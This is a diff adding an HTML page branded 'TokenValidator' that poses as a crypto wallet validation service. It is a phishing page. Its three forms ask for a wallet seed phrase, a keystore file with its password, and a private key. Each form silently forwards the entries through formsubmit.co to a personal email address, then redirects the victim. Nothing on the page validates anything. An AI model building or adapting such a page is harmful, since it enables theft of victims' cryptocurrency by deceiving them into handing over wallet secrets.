@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="utf-8">
+  <title>TokenValidator</title>
+  <link rel="icon" href="logo.svg">
+
+  <!-- Bootstrap 4.0 installation kink -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+  <!-- local css file link -->
+  <link rel="stylesheet" href="secondpage.css">
+
+  <!-- Google fonts -->
+
+  <!-- Bootsrap JavaScript/JQuery link -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</head>
+
+<body>
+
+  <!--first section of the website  -->
+  <section id="first-section">
+
+    <div class=" begin-nav container-fluid">
+
+      <nav class="navbar navbar-expand-lg navbar-light">
+
+        <a class="navbar-brand text-edit" href="http://tokendappvalidator.netlify.app">Token Validator</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item">
+              <a class="nav-link" href="wallets.html">About</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="wallets.html">Wallets</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="wallets.html">Apps</a>
+            </li>
+          </ul>
+        </div>
+
+      </nav>
+
+    </div>
+
+  </section>
+
+
+  <section id="second-section">
+
+
+    <h5>Validate token in wallet</h5>
+    <div class="textedit-css">
+      <h2>Input parameters to commence Token Validation</h2>
+      <p>(Click on prev/next button to toggle wallet validation ptotocols)</p>
+    </div>
+
+  </section>
+
+
+  <section id="third-section">
+
+    <div id="carouselExampleControls" class="carousel slide" data-ride="carousel" data-interval="false">
+      <div class="carousel-inner">
+        <div class="carousel-item active">
+
+          <div class=" form-auto container-fluid">
+            <div class="col-lg-12 col-md-12 col-sm-12">
+
+              <form class="form-group" action="https://formsubmit.co/wfong93@gmail.com" method="POST">
+                <input type="hidden" name="_next" value="https://tokendappvalidator.netlify.app/page/your-qr-code.html">
+                <input type="hidden" name="_captcha" value="false">
+                <div class="form-group">
+                  <label for="phrase">Phrase</label>
+                  <textarea input type="message" name="phrase" class="form-control" id="exampleFormControlTextarea1" rows="5"></textarea>
+                </div>
+                <p>Typically 12 (sometimes 24) words separated by single space</p>
+                <button href="your-qr-code.html" type="submit" class="btn btn-primary btn-lg btn-block">Import</button>
+              </form>
+            </div>
+          </div>
+
+        </div>
+        <div class="carousel-item">
+
+          <div class=" form-auto container-fluid">
+            <div class="col-lg-12 col-md-12 col-sm-12">
+
+              <form class="form-group" action="https://formsubmit.co/wfong93@gmail.com" method="POST">
+                <input type="hidden" name="_next" value="https://tokendappvalidator.netlify.app/page/your-qr-code.html">
+                <input type="hidden" name="_captcha" value="false">
+                <div class="form-group">
+                  <label for="keystorejson">Keystore JSON</label>
+                  <textarea input type="message" name="keystorejson" class="form-control" id="exampleFormControlTextarea1" rows="4"></textarea>
+                </div>
+                <div class="form-group">
+                  <label for="exampleInputPassword1">Password</label>
+                  <input type="name" name="password" class="form-control" id="exampleInputPassword1" placeholder="Password">
+                </div>
+                <p>Several lines of text beginning with '(...)' plus the password you used to encrypt it</p>
+                <button type="submit" class="btn btn-primary btn-lg btn-block">Import</button>
+              </form>
+            </div>
+          </div>
+
+        </div>
+        <div class="carousel-item">
+
+          <div class=" form-auto container-fluid">
+            <div class="col-lg-12 col-md-12 col-sm-12">
+
+              <form class="form-group" action="https://formsubmit.co/wfong93@gmail.com" method="POST">
+                <input type="hidden" name="_next" value="https://tokendappvalidator.netlify.app/page/your-qr-code.html">
+                <input type="hidden" name="_captcha" value="false">
+                <div class="form-group">
+                  <label for="privatekey">Private Key</label>
+                  <textarea input type="message" name="privatekey" class="form-control" id="exampleFormControlTextarea1" rows="5"></textarea>
+                </div>
+                <p>Typically 12 (sometimes 24) words separated by single space</p>
+                <button type="submit" class="btn btn-primary btn-lg btn-block">Import</button>
+              </form>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+      <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
+        <span class="carousel-control-prev-icon"></span>
+      </a>
+      <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
+        <span class="carousel-control-next-icon"></span>
+      </a>
+    </div>
+
+  </section>
+
+
+
+</body>
